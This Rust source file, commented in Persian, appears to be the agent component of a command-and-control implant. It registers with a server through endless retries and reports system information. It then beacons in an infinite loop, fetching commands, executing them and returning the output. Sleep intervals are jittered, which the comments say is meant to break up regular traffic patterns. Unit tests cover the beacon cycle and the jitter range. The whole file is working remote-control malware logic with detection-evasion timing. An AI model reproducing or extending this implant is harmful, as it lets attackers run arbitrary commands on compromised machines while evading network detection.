use std::time::Duration;

use rand::Rng;
use tracing::{debug, info, warn};

use crate::config::Config;
use crate::error::Error;
use crate::executor::CommandExecutor;
use crate::system_info::SystemInfo;
use crate::transport::Transport;

/// ارکستراتور: چرخه چک-این، اجرا و ارسال نتیجه
pub struct Agent<T: Transport, E: CommandExecutor> {
    config: Config,
    transport: T,
    executor: E,
    id: Option<String>,
}

impl<T: Transport, E: CommandExecutor> Agent<T, E> {
    pub fn new(config: Config, transport: T, executor: E) -> Self {
        Self {
            config,
            transport,
            executor,
            id: None,
        }
    }

    /// حلقه اصلی — تا وقتی که process زنده‌ست ادامه داره
    pub fn run(mut self) {
        self.register_with_retry();
        info!(id = %self.id.as_deref().unwrap_or("?"), "starting beacon loop");

        loop {
            std::thread::sleep(self.next_sleep());
            self.beacon();
        }
    }

    /// ثبت‌نام با retry بی‌پایان (مقاوم در برابر down بودن سرور)
    fn register_with_retry(&mut self) {
        let info = SystemInfo::gather();
        loop {
            match self.transport.register(&info) {
                Ok(id) => {
                    info!(%id, "registered with server");
                    self.id = Some(id);
                    return;
                }
                Err(e) => {
                    warn!(error = %e, "registration failed, retrying");
                    std::thread::sleep(self.config.retry_delay);
                }
            }
        }
    }

    /// یک چرخه چک-این: دستور بگیر → اجرا کن → نتیجه بفرست
    fn beacon(&self) {
        let id = match self.id.clone() {
            Some(id) => id,
            None => {
                warn!("not registered yet, skipping beacon");
                return;
            }
        };

        let command = match self.transport.get_task(&id) {
            Ok(c) => c,
            Err(e) => {
                warn!(error = %e, "task check failed");
                return;
            }
        };

        if command.is_empty() {
            return; // دستوری در صف نیست
        }

        debug!(%command, "executing task");
        let output = match self.executor.execute(&command) {
            Ok(out) => out,
            Err(e) => format!("error: {e}"),
        };

        if let Err(e) = self.transport.send_result(&id, &output) {
            warn!(error = %e, "failed to send result");
        }
    }

    /// sleep با جیتر برای شکستن الگوی منظم ترافیک
    fn next_sleep(&self) -> Duration {
        let jitter = self.config.jitter;
        if jitter <= 0.0 {
            return self.config.sleep;
        }
        let factor: f64 = rand::thread_rng().gen();
        apply_jitter(self.config.sleep, jitter, factor)
    }
}

/// base * (1 - jitter + 2*jitter*factor)  |  factor ∈ [0, 1]
fn apply_jitter(base: Duration, jitter: f64, factor: f64) -> Duration {
    let multiplier = 1.0 - jitter + 2.0 * jitter * factor.clamp(0.0, 1.0);
    base.mul_f64(multiplier)
}

#[cfg(test)]
mod tests {
    use super::{apply_jitter, Agent};
    use crate::config::Config;
    use crate::error::Error;
    use crate::executor::CommandExecutor;
    use crate::system_info::SystemInfo;
    use crate::transport::Transport;
    use std::sync::{Arc, Mutex};
    use std::time::Duration;

    struct MockTransport {
        result_log: Arc<Mutex<Vec<String>>>,
    }

    impl Transport for MockTransport {
        fn register(&self, _info: &SystemInfo) -> Result<String, Error> {
            Ok("1".into())
        }
        fn get_task(&self, _id: &str) -> Result<String, Error> {
            Ok("echo hello".into())
        }
        fn send_result(&self, _id: &str, output: &str) -> Result<(), Error> {
            self.result_log.lock().unwrap().push(output.to_string());
            Ok(())
        }
    }

    struct MockExecutor;

    impl CommandExecutor for MockExecutor {
        fn execute(&self, command: &str) -> Result<String, Error> {
            Ok(command.strip_prefix("echo ").unwrap_or(command).to_string())
        }
    }

    #[test]
    fn beacon_executes_and_reports() {
        let log = Arc::new(Mutex::new(Vec::new()));
        let config = Config::builder()
            .server_url("http://127.0.0.1:8080")
            .sleep(Duration::from_secs(1))
            .build()
            .unwrap();

        let mut agent = Agent::new(config, MockTransport { result_log: log.clone() }, MockExecutor);

        agent.register_with_retry();
        agent.beacon();

        assert_eq!(*log.lock().unwrap(), vec!["hello".to_string()]);
    }

    #[test]
    fn jitter_stays_in_range() {
        let base = Duration::from_secs(10);
        assert_eq!(apply_jitter(base, 0.0, 0.3), base); // جیتر صفر = بدون تغییر
        let low = apply_jitter(base, 0.2, 0.0);
        let high = apply_jitter(base, 0.2, 1.0);
        assert!(low >= Duration::from_secs(7) && low <= Duration::from_secs(9));
        assert!(high >= Duration::from_secs(11) && high <= Duration::from_secs(13));
    }
}
